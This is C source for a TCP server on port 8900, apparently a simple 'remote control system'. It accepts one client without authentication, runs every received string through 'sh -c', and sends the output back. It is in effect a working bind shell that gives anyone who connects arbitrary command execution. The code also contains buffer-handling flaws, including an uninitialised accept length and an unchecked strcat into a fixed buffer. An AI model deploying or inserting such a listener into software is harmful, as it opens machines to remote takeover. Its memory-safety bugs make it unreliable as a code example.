#include <stdlib.h>
#include <stdio.h>
// socket()
#include <sys/socket.h>
// struct sockaddr;struct sockaddr_in
#include <arpa/inet.h>
// memset
#include <string.h>
//close 
#include <unistd.h>
#include    <signal.h>

#define BUFSIZE 4096
#define  PORT 8900

FILE*    Popen(const char* commandstr, const char* mode)
{
    pid_t pid;
    int pfd[2];
    int nRet = pipe(pfd); 
    if (-1 == nRet)
    {
        printf("error: pipe() call fails\n");
        return NULL;
    }
    pid = fork();
    if (pid < 0)
        return NULL;
    else if (pid == 0)
    {
        close(pfd[0]);
        if (pfd[1] != STDOUT_FILENO)
        {
            dup2(pfd[1], STDOUT_FILENO); 
            close(pfd[1]);
        }
        execl("/bin/sh", "sh", "-c", commandstr, (char *)0);
        _exit(127);
    }
    else
    {
        close(pfd[1]);
        FILE *fp = NULL;
        if ((fp = fdopen(pfd[0], "r")) == NULL)
        {
            return NULL;
        }
        return fp;
    }
}

void exec(const char * command, char * result)
{
    FILE *fpRead;

    memset(result,0,BUFSIZE);
    fpRead = Popen(command, "r");
    char buf[BUFSIZ] = {0};
    memset(buf,'\0',sizeof(buf));

    while(fgets(buf,BUFSIZ-1,fpRead)!=NULL)
    {         
        strcat(result, buf);
    }
    if(fpRead!=NULL)
        pclose(fpRead);
}

int main()
{
    int sockfd;
    struct sockaddr_in serv;
    struct sockaddr_in client;
    char buf[BUFSIZ];
    char send_buf[BUFSIZ];
    int number;
    int length;
    int opt;
    char command[BUFSIZE];
    int connectd;
    int len;

    char cmd[]="sh -c ";
    // create the socket
    sockfd=socket(AF_INET,SOCK_STREAM,0);
    if (0>sockfd)
    {
        fprintf(stderr,"error in creating socket\n");
        exit(-1);
    }

    // set the address rebinding
    opt=1;
    if (setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,&opt,sizeof(opt))!=0)
    {
        fprintf(stderr,"error in setting socket option\n");
        close(sockfd);
        exit(-1);
    }



    // set the value for the socket
    memset(buf,0,sizeof(buf));
    memset(send_buf,0,sizeof(send_buf));
    memset(&serv,0,sizeof(serv));
    serv.sin_family=AF_INET;
    serv.sin_port=htons(PORT);
    serv.sin_addr.s_addr=htonl(INADDR_ANY);

    // bind the socket
    if (bind(sockfd,(struct sockaddr*)&serv,sizeof(serv))!=0)
    {
        fprintf(stderr,"error in binding server address\n");
        exit(-1);
    }

    //listen
    if (-1==listen(sockfd,5))
    {
        perror("listen error\n");
        exit(1);
    }
    //accept
    if (-1==(connectd=accept(sockfd,(struct sockaddr*)&client,&len)))
    	{
		perror("create connect socket error\n");
		exit(1);
    	}

    // communication
    while(1)
    {
        

        memset(send_buf,0,BUFSIZ);
        memset(buf,0,sizeof(buf));
        memset(command,0,sizeof(command));

	
        length=sizeof(client);
        number = recv(connectd,buf,sizeof(buf),0);
        //number=recvfrom(sockfd,buf,sizeof(buf),0,(struct sockaddr*)&client,(socklen_t*)&length);
        if (0>number)
        {
            fprintf(stderr,"error in communication\n");
            close(sockfd);
            exit(-1);
        }

        fprintf(stderr,"recv message:%s\n",buf);

	if(strcmp(buf,"quit")==0)
        {
            fprintf(stderr,"quit the remote control system\n");
            close(connectd);
            break;
        }

        sprintf(command,"%s%s",cmd,buf);
        exec(command,send_buf);
        
        fprintf(stderr,"send message\n:%s\n",send_buf);
        //number=sendto(sockfd,send_buf,strlen(send_buf),0,(struct sockaddr*)&client,length); 
        //sendnum = sprintf(send_buf,"byebye,the guest from %s\n",inet_ntoa(client.sin_addr));
        send(connectd,send_buf,strlen(send_buf),0);   
    }

    close(sockfd);
    return 0;

    


}